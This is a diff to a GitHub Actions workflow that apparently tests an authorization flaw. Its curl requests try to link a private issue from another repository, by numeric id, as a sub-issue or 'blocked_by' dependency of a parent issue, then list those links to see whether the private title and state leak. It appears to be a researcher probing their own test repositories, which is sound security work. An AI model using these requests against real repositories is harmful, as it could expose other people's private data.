@@ -10,10 +10,12 @@ jobs:
       - env:
           GH: ${{ github.token }}
         run: |
-          A="Authorization: Bearer $GH"; J="Accept: application/vnd.github+json"
-          echo "### CONTROL direct-read PRIVATE si-child (expect 404):"
-          curl -s -o /tmp/c -w "HTTP %{http_code}\n" -H "$A" -H "$J" https://api.github.com/repos/jackpas23/si-child/issues/1; head -c 200 /tmp/c; echo
-          echo "### ATTACK-ADD cross-repo sub_issue (private child id 4661219265 -> parent#2):"
-          curl -s -o /tmp/a -w "HTTP %{http_code}\n" -X POST -H "$A" -H "$J" https://api.github.com/repos/jackpas23/si-parent/issues/2/sub_issues -d '{"sub_issue_id":4661219265}'; head -c 500 /tmp/a; echo
-          echo "### ATTACK-LIST sub_issues of parent#2 (leak private title?):"
-          curl -s -H "$A" -H "$J" https://api.github.com/repos/jackpas23/si-parent/issues/2/sub_issues | python3 -c "import sys,json;d=json.load(sys.stdin);print([{'repo':x.get('repository',{}).get('full_name'),'title':x.get('title')} for x in d] if isinstance(d,list) else d)"
+          A="Authorization: Bearer $GH"; J="Accept: application/vnd.github+json"; V="X-GitHub-Api-Version: 2026-03-10"
+          echo "### CONTROL: repo-scoped token direct-read PRIVATE si-child (expect 404):"
+          curl -s -o /tmp/c -w "HTTP %{http_code}\n" -H "$A" -H "$J" https://api.github.com/repos/jackpas23/si-child/issues/1; head -c 120 /tmp/c; echo
+          echo "### SUBISSUE-ADD (known-good 403 control) private child -> parent#3:"
+          curl -s -o /tmp/s -w "HTTP %{http_code}\n" -X POST -H "$A" -H "$J" https://api.github.com/repos/jackpas23/si-parent/issues/3/sub_issues -d '{"sub_issue_id":4661219265}'; head -c 120 /tmp/s; echo
+          echo "### DEP-ADD blocked_by private child(4661219265) -> parent#3:"
+          curl -s -o /tmp/d -w "HTTP %{http_code}\n" -X POST -H "$A" -H "$J" -H "$V" https://api.github.com/repos/jackpas23/si-parent/issues/3/dependencies/blocked_by -d '{"issue_id":4661219265}'; head -c 400 /tmp/d; echo
+          echo "### DEP-LIST blocked_by of parent#3 (LEAK private title?):"
+          curl -s -H "$A" -H "$J" -H "$V" https://api.github.com/repos/jackpas23/si-parent/issues/3/dependencies/blocked_by | python3 -c "import sys,json;d=json.load(sys.stdin);print([{'repo':x.get('repository',{}).get('full_name'),'num':x.get('number'),'title':x.get('title'),'state':x.get('state')} for x in d] if isinstance(d,list) else d)"
